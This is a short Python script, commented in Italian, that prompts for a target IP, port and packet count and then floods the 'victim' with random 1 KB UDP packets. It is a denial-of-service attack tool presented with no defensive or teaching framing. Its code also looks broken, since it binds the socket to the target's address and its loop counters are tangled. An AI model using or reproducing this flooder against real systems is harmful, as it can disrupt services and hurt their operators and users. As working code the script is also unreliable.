import socket
import random


target = input("TARGET IP: ")
port = int(input("TARGET PORT: "))
numofpackets = int(input("How many packets: "))


while (0 < numofpackets):	
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	# AF_INET = IPv4 \\\ SOCK_DGRAM = UDP
	s.bind((target, port))		# Il metodo .bind() utilizzato per associare il socket a un'interfaccia di rete (target) e a un numero di porta (port)

	data = random.randbytes(1024)		# Creazione pacchetto da 1KB
	victim = (str(target), int(port))

	for i in range(numofpackets):
		s.sendto(data, victim)
		print(f"Sent: {i}", end='\r')
		numofpackets -= 1

	s.close()
